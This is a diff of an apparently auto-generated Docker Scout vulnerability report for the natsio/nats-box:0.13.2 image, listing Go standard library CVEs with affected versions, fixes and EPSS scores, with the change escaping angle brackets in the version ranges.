@@ -1,9 +1,7 @@
 ---
 hide_table_of_contents: true
 ---
-<h2>:mag: Vulnerabilities of <code>natsio/nats-box:0.13.2</code></h2>
 
-<details open="true"><summary>:package: Image Reference</strong> <code>natsio/nats-box:0.13.2</code></summary>
 <table>
 <tr><td>digest</td><td><code>sha256:239686382b90553f1870522c3b0f073321d3f57e7f6934b09f0347a6341a2e44</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 6" src="https://img.shields.io/badge/critical-6-8b1924"/> <img alt="high: 36" src="https://img.shields.io/badge/high-36-e25d68"/> <img alt="medium: 42" src="https://img.shields.io/badge/medium-42-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/low-0-lightgrey"/> <!-- unspecified: 0 --></td></tr>
 <tr><td>platform</td><td>linux/arm64</td></tr>
@@ -21,7 +19,7 @@ hide_table_of_contents: true
 <a href="https://scout.docker.com/v/CVE-2024-24790?s=golang&n=stdlib&t=golang&vr=%3C1.21.11"><img alt="critical : CVE--2024--24790" src="https://img.shields.io/badge/CVE--2024--24790-lightgrey?label=critical%20&labelColor=8b1924"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.21.11</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.21.11</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.21.11</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.082%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
@@ -38,7 +36,7 @@ The various Is methods (IsPrivate, IsLoopback, etc) did not work as expected for
 <a href="https://scout.docker.com/v/CVE-2023-24540?s=golang&n=stdlib&t=golang&vr=%3C1.19.9"><img alt="critical : CVE--2023--24540" src="https://img.shields.io/badge/CVE--2023--24540-lightgrey?label=critical%20&labelColor=8b1924"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.9</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.9</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.9</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.250%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
@@ -55,7 +53,7 @@ Not all valid JavaScript whitespace characters are considered to be whitespace. 
 <a href="https://scout.docker.com/v/CVE-2023-24538?s=golang&n=stdlib&t=golang&vr=%3C1.19.8"><img alt="critical : CVE--2023--24538" src="https://img.shields.io/badge/CVE--2023--24538-lightgrey?label=critical%20&labelColor=8b1924"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.664%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
@@ -80,7 +78,7 @@ Users who rely on the previous behavior can re-enable it using the GODEBUG flag 
 <a href="https://scout.docker.com/v/CVE-2025-22871?s=golang&n=stdlib&t=golang&vr=%3C1.23.8"><img alt="critical : CVE--2025--22871" src="https://img.shields.io/badge/CVE--2025--22871-lightgrey?label=critical%20&labelColor=8b1924"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.23.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.23.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.23.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
@@ -97,7 +95,7 @@ The net/http package improperly accepts a bare LF as a line terminator in chunke
 <a href="https://scout.docker.com/v/CVE-2023-29403?s=golang&n=stdlib&t=golang&vr=%3C1.19.10"><img alt="high : CVE--2023--29403" src="https://img.shields.io/badge/CVE--2023--29403-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.10</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.10</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.10</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.009%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
@@ -116,7 +114,7 @@ If a setuid/setgid binary is executed with standard I/O file descriptors closed,
 <a href="https://scout.docker.com/v/CVE-2025-61729?s=golang&n=stdlib&t=golang&vr=%3C1.24.11"><img alt="high : CVE--2025--61729" src="https://img.shields.io/badge/CVE--2025--61729-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.11</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.11</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.11</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
@@ -133,7 +131,7 @@ Within HostnameError.Error(), when constructing an error string, there is no lim
 <a href="https://scout.docker.com/v/CVE-2025-61725?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--61725" src="https://img.shields.io/badge/CVE--2025--61725-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
@@ -150,7 +148,7 @@ The ParseAddress function constructs domain-literal address components through r
 <a href="https://scout.docker.com/v/CVE-2025-61723?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--61723" src="https://img.shields.io/badge/CVE--2025--61723-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
@@ -169,7 +167,7 @@ This affects programs which parse untrusted PEM inputs.
 <a href="https://scout.docker.com/v/CVE-2025-58188?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--58188" src="https://img.shields.io/badge/CVE--2025--58188-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
@@ -188,7 +186,7 @@ This affects programs which validate arbitrary certificate chains.
 <a href="https://scout.docker.com/v/CVE-2025-58187?s=golang&n=stdlib&t=golang&vr=%3C1.24.9"><img alt="high : CVE--2025--58187" src="https://img.shields.io/badge/CVE--2025--58187-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.9</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.9</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.9</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
@@ -207,7 +205,7 @@ This affects programs which validate arbitrary certificate chains.
 <a href="https://scout.docker.com/v/CVE-2024-34158?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="high : CVE--2024--34158" src="https://img.shields.io/badge/CVE--2024--34158-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.22.7</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.147%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
@@ -224,7 +222,7 @@ Calling Parse on a "// +build" build tag line with deeply nested expressions can
 <a href="https://scout.docker.com/v/CVE-2024-34156?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="high : CVE--2024--34156" src="https://img.shields.io/badge/CVE--2024--34156-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.22.7</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.298%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
@@ -241,7 +239,7 @@ Calling Decoder.Decode on a message which contains deeply nested structures can 
 <a href="https://scout.docker.com/v/CVE-2024-24791?s=golang&n=stdlib&t=golang&vr=%3C1.21.12"><img alt="high : CVE--2024--24791" src="https://img.shields.io/badge/CVE--2024--24791-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.21.12</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.21.12</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.21.12</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.618%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
@@ -260,7 +258,7 @@ An attacker sending a request to a net/http/httputil.ReverseProxy proxy can expl
 <a href="https://scout.docker.com/v/CVE-2024-24784?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="high : CVE--2024--24784" src="https://img.shields.io/badge/CVE--2024--24784-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.21.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>1.498%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
@@ -277,7 +275,7 @@ The ParseAddressList function incorrectly handles comments (text within parenthe
 <a href="https://scout.docker.com/v/CVE-2023-45288?s=golang&n=stdlib&t=golang&vr=%3C1.21.9"><img alt="high : CVE--2023--45288" src="https://img.shields.io/badge/CVE--2023--45288-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.21.9</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.21.9</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.21.9</code></td></tr>
 <tr><td>EPSS Score</td><td><code>66.635%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
@@ -300,7 +298,7 @@ The fix sets a limit on the amount of excess header frames we will process befor
 <a href="https://scout.docker.com/v/CVE-2023-45287?s=golang&n=stdlib&t=golang&vr=%3C1.20.0"><img alt="high : CVE--2023--45287" src="https://img.shields.io/badge/CVE--2023--45287-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.20.0</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.20.0</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.20.0</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.185%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
@@ -319,7 +317,7 @@ In Go 1.20, the crypto/tls library switched to a fully constant time RSA impleme
 <a href="https://scout.docker.com/v/CVE-2023-45283?s=golang&n=stdlib&t=golang&vr=%3C1.20.11"><img alt="high : CVE--2023--45283" src="https://img.shields.io/badge/CVE--2023--45283-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.20.11</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.20.11</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.20.11</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.097%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
@@ -346,7 +344,7 @@ UPDATE: Go 1.20.11 and Go 1.21.4 inadvertently changed the definition of the vol
 <a href="https://scout.docker.com/v/CVE-2023-44487?s=golang&n=stdlib&t=golang&vr=%3C1.20.10"><img alt="high : CVE--2023--44487" src="https://img.shields.io/badge/CVE--2023--44487-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.20.10</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.20.10</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.20.10</code></td></tr>
 <tr><td>EPSS Score</td><td><code>94.419%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
@@ -369,7 +367,7 @@ The default stream concurrency limit is 250 streams (requests) per HTTP/2 connec
 <a href="https://scout.docker.com/v/CVE-2023-39325?s=golang&n=stdlib&t=golang&vr=%3C1.20.10"><img alt="high : CVE--2023--39325" src="https://img.shields.io/badge/CVE--2023--39325-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.20.10</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.20.10</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.20.10</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.163%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
@@ -392,7 +390,7 @@ The default stream concurrency limit is 250 streams (requests) per HTTP/2 connec
 <a href="https://scout.docker.com/v/CVE-2023-24537?s=golang&n=stdlib&t=golang&vr=%3C1.19.8"><img alt="high : CVE--2023--24537" src="https://img.shields.io/badge/CVE--2023--24537-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
@@ -409,7 +407,7 @@ Calling any of the Parse functions on Go source code which contains //line direc
 <a href="https://scout.docker.com/v/CVE-2023-24536?s=golang&n=stdlib&t=golang&vr=%3C1.19.8"><img alt="high : CVE--2023--24536" src="https://img.shields.io/badge/CVE--2023--24536-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.059%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
@@ -441,7 +439,7 @@ In addition, the fixed mime/multipart.Reader imposes the following limits on the
 <a href="https://scout.docker.com/v/CVE-2023-24534?s=golang&n=stdlib&t=golang&vr=%3C1.19.8"><img alt="high : CVE--2023--24534" src="https://img.shields.io/badge/CVE--2023--24534-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
@@ -462,7 +460,7 @@ With fix, header parsing now correctly allocates only the memory required to hol
 <a href="https://scout.docker.com/v/CVE-2022-41725?s=golang&n=stdlib&t=golang&vr=%3C1.19.6"><img alt="high : CVE--2022--41725" src="https://img.shields.io/badge/CVE--2022--41725-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.6</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.6</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.6</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.046%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
@@ -489,7 +487,7 @@ Users should be aware that multipart.ReadForm and the http.Request methods that 
 <a href="https://scout.docker.com/v/CVE-2022-41724?s=golang&n=stdlib&t=golang&vr=%3C1.19.6"><img alt="high : CVE--2022--41724" src="https://img.shields.io/badge/CVE--2022--41724-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.6</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.6</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.6</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
@@ -510,7 +508,7 @@ This affects all TLS 1.3 clients, TLS 1.2 clients which explicitly enable sessio
 <a href="https://scout.docker.com/v/CVE-2022-41723?s=golang&n=stdlib&t=golang&vr=%3C1.19.6"><img alt="high : CVE--2022--41723" src="https://img.shields.io/badge/CVE--2022--41723-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.6</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.6</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.6</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.235%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
@@ -527,7 +525,7 @@ A maliciously crafted HTTP/2 stream could cause excessive CPU consumption in the
 <a href="https://scout.docker.com/v/CVE-2022-41722?s=golang&n=stdlib&t=golang&vr=%3C1.19.6"><img alt="high : CVE--2022--41722" src="https://img.shields.io/badge/CVE--2022--41722-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.6</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.6</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.6</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.169%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
@@ -590,7 +588,7 @@ In syscall.StartProcess and os/exec.Cmd, invalid environment variable values con
 <a href="https://scout.docker.com/v/CVE-2022-30635?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="high : CVE--2022--30635" src="https://img.shields.io/badge/CVE--2022--30635-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.22.7</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.160%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>37th percentile</code></td></tr>
@@ -607,7 +605,7 @@ Calling Decoder.Decode on a message which contains deeply nested structures can 
 <a href="https://scout.docker.com/v/CVE-2023-29400?s=golang&n=stdlib&t=golang&vr=%3C1.19.9"><img alt="high : CVE--2023--29400" src="https://img.shields.io/badge/CVE--2023--29400-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.9</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.9</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.9</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.049%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
@@ -624,7 +622,7 @@ Templates containing actions in unquoted HTML attributes (e.g. "attr={{.}}") exe
 <a href="https://scout.docker.com/v/CVE-2023-24539?s=golang&n=stdlib&t=golang&vr=%3C1.19.9"><img alt="high : CVE--2023--24539" src="https://img.shields.io/badge/CVE--2023--24539-lightgrey?label=high%20&labelColor=e25d68"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.9</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.9</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.9</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.067%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
@@ -641,7 +639,7 @@ Angle brackets (<>) are not considered dangerous characters when inserted into C
 <a href="https://scout.docker.com/v/CVE-2025-4673?s=golang&n=stdlib&t=golang&vr=%3C1.23.10"><img alt="medium : CVE--2025--4673" src="https://img.shields.io/badge/CVE--2025--4673-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.23.10</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.23.10</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.23.10</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
@@ -658,7 +656,7 @@ Proxy-Authorization and Proxy-Authenticate headers persisted on cross-origin red
 <a href="https://scout.docker.com/v/CVE-2025-61727?s=golang&n=stdlib&t=golang&vr=%3C1.24.11"><img alt="medium : CVE--2025--61727" src="https://img.shields.io/badge/CVE--2025--61727-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.11</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.11</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.11</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
@@ -675,7 +673,7 @@ An excluded subdomain constraint in a certificate chain does not restrict the us
 <a href="https://scout.docker.com/v/CVE-2025-47906?s=golang&n=stdlib&t=golang&vr=%3C1.23.12"><img alt="medium : CVE--2025--47906" src="https://img.shields.io/badge/CVE--2025--47906-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.23.12</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.23.12</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.23.12</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
@@ -692,7 +690,7 @@ If the PATH environment variable contains paths which are executables (rather th
 <a href="https://scout.docker.com/v/CVE-2023-45290?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2023--45290" src="https://img.shields.io/badge/CVE--2023--45290-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.21.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.362%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
@@ -711,7 +709,7 @@ With fix, the ParseMultipartForm function now correctly limits the maximum size 
 <a href="https://scout.docker.com/v/CVE-2023-29406?s=golang&n=stdlib&t=golang&vr=%3C1.19.11"><img alt="medium : CVE--2023--29406" src="https://img.shields.io/badge/CVE--2023--29406-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.11</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.11</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.11</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.236%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
@@ -730,7 +728,7 @@ With fix, the HTTP/1 client now refuses to send requests containing an invalid R
 <a href="https://scout.docker.com/v/CVE-2024-45341?s=golang&n=stdlib&t=golang&vr=%3C1.22.11"><img alt="medium : CVE--2024--45341" src="https://img.shields.io/badge/CVE--2024--45341-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.22.11</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.22.11</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.22.11</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
@@ -749,7 +747,7 @@ Certificates containing URIs are not permitted in the web PKI, so this only affe
 <a href="https://scout.docker.com/v/CVE-2024-45336?s=golang&n=stdlib&t=golang&vr=%3C1.22.11"><img alt="medium : CVE--2024--45336" src="https://img.shields.io/badge/CVE--2024--45336-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.22.11</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.22.11</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.22.11</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.078%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
@@ -768,7 +766,7 @@ In the event that the client received a subsequent same-domain redirect, however
 <a href="https://scout.docker.com/v/CVE-2023-39319?s=golang&n=stdlib&t=golang&vr=%3C1.20.8"><img alt="medium : CVE--2023--39319" src="https://img.shields.io/badge/CVE--2023--39319-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.20.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.20.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.20.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.085%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
@@ -785,7 +783,7 @@ The html/template package does not apply the proper rules for handling occurrenc
 <a href="https://scout.docker.com/v/CVE-2023-39318?s=golang&n=stdlib&t=golang&vr=%3C1.20.8"><img alt="medium : CVE--2023--39318" src="https://img.shields.io/badge/CVE--2023--39318-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.20.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.20.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.20.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.085%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
@@ -802,7 +800,7 @@ The html/template package does not properly handle HTML-like "" comment tokens, 
 <a href="https://scout.docker.com/v/CVE-2024-24783?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2024--24783" src="https://img.shields.io/badge/CVE--2024--24783-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.21.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.445%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
@@ -821,7 +819,7 @@ This affects all crypto/tls clients, and servers that set Config.ClientAuth to V
 <a href="https://scout.docker.com/v/CVE-2025-0913?s=golang&n=stdlib&t=golang&vr=%3C1.23.10"><img alt="medium : CVE--2025--0913" src="https://img.shields.io/badge/CVE--2025--0913-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.23.10</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.23.10</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.23.10</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.008%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
@@ -838,7 +836,7 @@ os.OpenFile(path, os.O_CREATE|O_EXCL) behaved differently on Unix and Windows sy
 <a href="https://scout.docker.com/v/CVE-2024-24789?s=golang&n=stdlib&t=golang&vr=%3C1.21.11"><img alt="medium : CVE--2024--24789" src="https://img.shields.io/badge/CVE--2024--24789-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.21.11</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.21.11</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.21.11</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
@@ -855,7 +853,7 @@ The archive/zip package's handling of certain types of invalid zip files differs
 <a href="https://scout.docker.com/v/CVE-2024-24785?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2024--24785" src="https://img.shields.io/badge/CVE--2024--24785-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.21.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.273%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
